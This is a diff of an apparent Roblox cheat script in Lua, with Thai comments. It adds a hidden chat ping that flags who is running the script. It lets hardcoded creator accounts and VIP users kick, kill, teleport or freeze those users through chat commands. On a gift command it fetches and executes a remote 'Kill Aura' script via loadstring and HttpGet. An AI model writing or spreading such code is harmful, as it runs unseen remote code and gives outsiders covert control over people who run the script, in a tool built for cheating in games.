@@ -14,7 +14,8 @@ _G.VIP_LIST = _G.VIP_LIST or {
 }
 local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
 local GIFTED_LIST = {} 
-local HAS_COMMAND_POWER = {} -- เก็บรายชื่อคนที่ได้รับสิทธิ์จาก !cmd
+local HAS_COMMAND_POWER = {}
+local ACTIVE_USERS = {} -- เก็บรายชื่อคนที่รันสคริปต์ในเซิร์ฟนี้
 
 -- [Start Logic] ฟังก์ชันสำหรับเล่นเสียง UI
 local function PlayUISound(id)
@@ -106,10 +107,6 @@ local function ShowWelcome()
 end
 
 task.spawn(ShowWelcome)
-
-if not Player:FindFirstChild("ScriptWord_Active") then
-    Instance.new("StringValue", Player).Name = "ScriptWord_Active"
-end
 
 local function MakeDraggable(frame)
     local dragging, dragInput, dragStart, startPos
@@ -227,27 +224,16 @@ local MinAdminBtn = CreateBtn("🛡", UDim2.new(0.5, -180, 0.5, -125), Color3.fr
 MinAdminBtn.Visible = (ADMIN_COMMANDER[Player.Name] ~= nil)
 MinAdminBtn.MouseButton1Click:Connect(function() AdminPanel.Visible = not AdminPanel.Visible end)
 
--- [จุดแก้ไข] ปรับปรุง UpdateBoard ให้แสดงทุกคนที่รันสคริปต์และสิทธิ์ที่ได้รับ
 local function UpdateBoard()
     for _, v in pairs(Scroll:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end
     Instance.new("UIListLayout", Scroll).Padding = UDim.new(0, 4)
     for _, p in pairs(game.Players:GetPlayers()) do
-        local isRunning = p:FindFirstChild("ScriptWord_Active")
-        -- แสดงชื่อคนบนบอร์ดถ้าเขารันสคริปต์อยู่ หรือมีสิทธิ์พิเศษ
-        if isRunning or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or GIFTED_LIST[p.Name] or HAS_COMMAND_POWER[p.Name] then
-            local tag, color = "[ACTIVE]", Color3.fromRGB(100, 255, 100) -- ค่าเริ่มต้นสำหรับคนรันสคริปต์
-            
-            -- จัดลำดับความสำคัญของสิทธิ์
-            if ADMIN_COMMANDER[p.Name] then 
-                tag, color = "[CREATOR]", Color3.fromRGB(255,50,50)
-            elseif _G.VIP_LIST[p.Name] then 
-                tag, color = "[VIP]", Color3.fromRGB(255,215,0)
-            elseif HAS_COMMAND_POWER[p.Name] then 
-                tag, color = "[CMD]", Color3.fromRGB(255,0,255)
-            elseif GIFTED_LIST[p.Name] then 
-                tag, color = "[GFT]", Color3.fromRGB(0,255,255) 
-            end
-
+        if ACTIVE_USERS[p.Name] or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or GIFTED_LIST[p.Name] or HAS_COMMAND_POWER[p.Name] then
+            local tag, color = "[ACTIVE]", Color3.fromRGB(100, 255, 100)
+            if ADMIN_COMMANDER[p.Name] then tag, color = "[CREATOR]", Color3.fromRGB(255,50,50)
+            elseif _G.VIP_LIST[p.Name] then tag, color = "[VIP]", Color3.fromRGB(255,215,0)
+            elseif HAS_COMMAND_POWER[p.Name] then tag, color = "[CMD]", Color3.fromRGB(255,0,255)
+            elseif GIFTED_LIST[p.Name] then tag, color = "[GFT]", Color3.fromRGB(0,255,255) end
             local l = Instance.new("TextLabel", Scroll)
             l.Size = UDim2.new(1, -5, 0, 22); l.Text = " " .. tag .. " " .. p.Name
             l.TextColor3 = color; l.BackgroundTransparency = 1; l.Font = Enum.Font.FredokaOne; l.TextSize = 12
@@ -259,6 +245,12 @@ end
 task.spawn(function() while task.wait(3) do UpdateBoard() end end)
 
 local function ListenChat(speaker, msg)
+    if msg == "[ScriptWord_Ping]" then
+        ACTIVE_USERS[speaker.Name] = true
+        UpdateBoard()
+        return
+    end
+
     local args = msg:split(" ")
     local cmd = args[1]:lower()
     local function findTarget(name)
@@ -267,47 +259,61 @@ local function ListenChat(speaker, msg)
     end
     local target = args[2] and findTarget(args[2])
 
-    -- เช็คสิทธิ์การใช้คำสั่ง
-    local hasPower = ADMIN_COMMANDER[speaker.Name] or HAS_COMMAND_POWER[speaker.Name]
+    -- [จุดแก้ไข] เช็คสิทธิ์: เป็น Admin หรือ เป็นคนที่มี VIP อยู่แล้ว
+    local hasAnyPower = ADMIN_COMMANDER[speaker.Name] or _G.VIP_LIST[speaker.Name] or HAS_COMMAND_POWER[speaker.Name]
 
-    if hasPower then
+    if hasAnyPower then
         if speaker ~= Player then PlayUISound(203785501) end
         
-        -- [Give VIP Logic]
+        -- สิทธิ์การ Give VIP (Admin และ VIP สามารถให้ได้)
         if cmd == "!givevip" and target == Player then
-            GIFTED_LIST[Player.Name] = speaker.Name
+            GIFTED_LIST[Player.Name] = speaker.Name -- บันทึกว่าโดนกิ้ฟโดยใคร
             UpdateBoard()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
         end
-
-        if cmd == "!killall" then 
-            if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
-        elseif cmd == "!kickall" then 
-            CustomKick() 
+        
+        -- เฉพาะ Admin เท่านั้นที่ให้สิทธิ์ CMD (สิทธิ์รันแผงควบคุม)
+        if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then
+            HAS_COMMAND_POWER[Player.Name] = true
+            AdminPanel.Visible = true; MinAdminBtn.Visible = true
+            UpdateBoard()
         end
 
+        -- [หัวใจสำคัญ] ถ้า "เรา" คือคนที่โดนกิ้ฟ และคนสั่งคือ "คนที่กิ้ฟให้เรา" (หรือเป็น Admin)
         if target == Player then
-            if cmd == "!kick" then CustomKick()
-            elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
-            elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
-            elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
-            elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
+            -- เช็คว่าคนสั่งคือคนที่กิ้ฟให้เราใช่ไหม
+            local isMyGiver = (GIFTED_LIST[Player.Name] == speaker.Name)
+            
+            if ADMIN_COMMANDER[speaker.Name] or isMyGiver then
+                if cmd == "!kick" then CustomKick()
+                elseif cmd == "!kill" then if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+                elseif cmd == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
+                elseif cmd == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
+                elseif cmd == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false end
+            end
         end
-    end
 
-    -- [Give Command Logic]
-    if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then 
-        HAS_COMMAND_POWER[Player.Name] = true
-        AdminPanel.Visible = true
-        MinAdminBtn.Visible = true
-        UpdateBoard()
+        -- คำสั่งหมู่ (เฉพาะ Admin)
+        if ADMIN_COMMANDER[speaker.Name] then
+            if cmd == "!killall" then 
+                if Player.Character:FindFirstChild("Humanoid") then Player.Character.Humanoid.Health = 0 end
+            elseif cmd == "!kickall" then 
+                CustomKick() 
+            end
+        end
     end
 end
+
+task.spawn(function()
+    task.wait(2)
+    local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+    if chatEvent then chatEvent.SayMessageRequest:FireServer("[ScriptWord_Ping]", "All") end
+end)
 
 CmdBar.FocusLost:Connect(function(e) if e then PlayUISound(452267918); ListenChat(Player, CmdBar.Text); CmdBar.Text = "" end end)
 game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) ListenChat(p,m) end); UpdateBoard() end)
 for _,p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(m) ListenChat(p,m) end) end
-game.Players.PlayerRemoving:Connect(UpdateBoard)
+game.Players.PlayerRemoving:Connect(function(p) ACTIVE_USERS[p.Name] = nil; UpdateBoard() end)
 
 if _G.VIP_LIST[MyName] or ADMIN_COMMANDER[MyName] then
     if ADMIN_COMMANDER[MyName] then AdminPanel.Visible = true end
